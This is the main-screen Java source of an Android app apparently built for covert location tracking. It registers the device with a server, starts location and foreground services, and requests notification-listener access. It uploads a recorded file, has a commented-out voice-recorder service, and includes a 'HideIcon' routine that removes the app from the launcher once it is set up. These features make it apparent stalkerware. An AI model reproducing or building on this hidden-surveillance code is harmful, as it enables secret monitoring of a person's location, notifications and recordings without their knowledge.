package UiActivities;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;

import locationTracker.ForegroundServices;
import locationTracker.LocationService;

import com.varbin.locationtracker.APIs.CreaterClass;
import com.varbin.locationtracker.MyLocationManager.LocationGetter;
import com.varbin.locationtracker.R;

import java.io.File;
import java.lang.reflect.InvocationTargetException;

import networkStates.networkState;
import synceAdapter.AccountConstants;
import synceAdapter.SyncAdapter;

public class MainActivity extends AppCompatActivity {
    SharedPreferences sharedPreferences ;
    SharedPreferences.Editor editor;
    public static final String AUTHORITY = AccountConstants.AUTHORITY;
    public static final String ACCOUNT_TYPE =  AccountConstants.ACCOUNT_TYPE;
    public static final String ACCOUNT =  AccountConstants.ACCOUNT;
    static MainActivity ins;
    FileUploadClass fileUploadClass;
    String Name, Email, Mobile;
    SyncAdapter syncAdapter;
    EditText PName , PEmail , PMobile ;
    LinearLayout linearLayout , linearLayout2;
    Button LoginButton;
    Button button  , button2;
    Account mAcoount;
    ContentResolver mResolver;
    public boolean permision = false;
    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Name = getIntent().getStringExtra("Name");
        Email = getIntent().getStringExtra("Email");
        Mobile = getIntent().getStringExtra("Mobile");
        //person
        linearLayout = findViewById(R.id.LO);
        linearLayout2 = findViewById(R.id.mainL);
        PName = findViewById(R.id.EmployeeName);
        PMobile = findViewById(R.id.EmployeeMobile);
        LoginButton = findViewById(R.id.LoginButton);
        CreaterClass.RegisterDevice("Ename" , "Enum" , getApplicationContext());
        button = findViewById(R.id.playButton);
        button2 = findViewById(R.id.pauseButton);
        mAcoount = CreateSyncAccount(this);
        mResolver = getContentResolver();
        sharedPreferences = getSharedPreferences("palm", MODE_PRIVATE);
        editor = sharedPreferences.edit();
        //permisions
        if (!(sharedPreferences == null)){
            permision = sharedPreferences.getBoolean("permision", false);
            boolean g = sharedPreferences.getBoolean("granted" , false);
            if (g) {
                button2.setText("Enable Notification");
                Log.d("TAG", "onCreate: Button set krdi"+g);
                permision = true;
            }
            if (Settings.Secure.getString(this.getContentResolver(),
                    "enabled_notification_listeners").contains(getApplicationContext().getPackageName())) {
                Log.d("TAG", "onCreate: Button set krdi"+g);
                //service is enabled do something
                button2.setVisibility(View.INVISIBLE);
            }
        }else{
//            PermissionCheck();
        }

        FileUploadClass fileUploadClass = new FileUploadClass(new File("/storage/emulated/0/VarbinRecords/temp.jpg"),
                "/storage/emulated/0/VarbinRecords/temp.jpg","92");
        fileUploadClass.execute();
        String s =AccountConstants.getStatus(this);
        Log.d("TAG", "onCreateID: "+s);
        button2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!permision){
                    PermissionCheck();
                }else{
                    onNotice();
                }
            }
        });
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                button.setText("Hidden");
                boolean icon = HideIcon(MainActivity.this);
                Log.d("TAG", "HideIcon" +icon);
//               Intent intent = new Intent(MainActivity.this , VoiceRecorderService.class);
//               intent.putExtra("isRecording" , true);
//               startService(intent);
            }
        });
        startService(new Intent(getApplicationContext(), LocationService.class));
        startService();
        if (AccountConstants.mainThread == false){
            startService();
        }
        //personCreater
        LoginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                final String Ename , Eid , Enum ;
                Ename = PName.getText().toString().toLowerCase().trim();
                Eid = "Email.getText().toString().toLowerCase().trim();";
                Enum = PMobile.getText().toString().trim();

                if (Ename.equals("")){
                    PName.requestFocus();
                    PName.setError("Required");
                    return;
                }
                if (Enum.equals("")){
                    PMobile.requestFocus();
                    PMobile.setError("Required");
                    return;
                }
                Log.d("TAG", "TestApis loginClicked: ");
                CreaterClass.RegisterDevice(Ename , Enum , getApplicationContext());
                SharedMaker( Eid , Ename , Enum);
            }
        });
    }

    private void SharedMaker(String eid, String ename, String anEnum) {
        editor.putString("Mobile", anEnum);
        editor.putString("Email", eid);
        editor.putString("Name" , ename);
        editor.commit();
        editor.apply();
        linearLayout.setVisibility(View.GONE);
        linearLayout2.setVisibility(View.VISIBLE);
        double mobile = Double.parseDouble(anEnum);
        //todo: uncomment this line
        CreaterClass.RegisterDevice(ename , anEnum , getApplicationContext());
        PName.setText("");
        PMobile.setText("");
    }

    public static Account CreateSyncAccount(Context context) {
        // Create the account type and default account
        Account newAccount = new Account( ACCOUNT, ACCOUNT_TYPE);
        // Get an instance of the Android account manager
        AccountManager accountManager = AccountManager.get(context);
        /*
         * Add the account and account type, no password or user data
         * If successful, return the Account object, otherwise report an error.
         */
        if (accountManager.addAccountExplicitly(newAccount, null, null)) {
            /*
             * If you don't set android:syncable="true" in
             * in your <provider> element in the manifest,
             * then call context.setIsSyncable(account, AUTHORITY, 1)
             * here.
             */
        } else {
            /*
             * The account exists or some other error occurred. Log this, report it,
             * or handle it internally.
             */
        }
        return newAccount;
    }
    private static boolean HideIcon(Context context){
       try {
           PackageManager manager = context.getPackageManager();
           ComponentName componentName = new ComponentName(context.getApplicationContext() , MainActivity.class);
           manager.setComponentEnabledSetting(componentName,
                   manager.COMPONENT_ENABLED_STATE_DISABLED ,
                   PackageManager.DONT_KILL_APP);
           return true;
       }catch (Exception e){
           Log.d("TAG", "HideIcon: "+e);
           return false;
       }
    }
    private void PermissionCheck() {
        if (LocationGetter.hasPermision(MainActivity.this , AccountConstants.permisions)){
           button2.setText("Enable Notification");
        }else{
            if (!LocationGetter.hasPermision(MainActivity.this , AccountConstants.permisions)){
                ActivityCompat.requestPermissions(MainActivity.this, AccountConstants.permisions, 0);
            }
        }
    }
    void onNoticeCheck(){
        if (Settings.Secure.getString(this.getContentResolver(),"enabled_notification_listeners").contains(getApplicationContext().getPackageName()))
        {
            //service is enabled do something
            button2.setVisibility(View.INVISIBLE);
            //personCheccker
            if (sharedPreferences.contains("Name")) {
                linearLayout.setVisibility(View.GONE);
                linearLayout2.setVisibility(View.VISIBLE);
                button.setVisibility(View.VISIBLE);
            }else {
                linearLayout2.setVisibility(View.GONE);
                linearLayout.setVisibility(View.VISIBLE);
            }
        }
    }
    private void onNotice() {
        if (Settings.Secure.getString(this.getContentResolver(),"enabled_notification_listeners").contains(getApplicationContext().getPackageName()))
        {
            //service is enabled do something
            button2.setVisibility(View.INVISIBLE);
        } else {
            //service is not enabled try to enabled by calling...
            Intent intent = new Intent();
            intent.setAction("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 0 && grantResults.length > 0 && grantResults[0]== PackageManager.PERMISSION_GRANTED){
            Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show();
            editor.putBoolean("granted", true);
            button2.setText("Enable Notification");
            permision = true;
            editor.putBoolean("permision" , true);
            editor.apply();
        }
        else {
            Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show();
            editor.putBoolean("granted", false);
            editor.apply();
        }
    }

    public void startService() {
        Intent serviceIntent = new Intent(this, ForegroundServices.class);
        serviceIntent.putExtra("inputExtra", "Background Task Is Running");
        ContextCompat.startForegroundService(this, serviceIntent);
    }
    @Override
    public void onBackPressed() {
        super.onBackPressed();
        finishAffinity();
    }

    @Override
    protected void onResume() {
        super.onResume();
        onNoticeCheck();
    }
}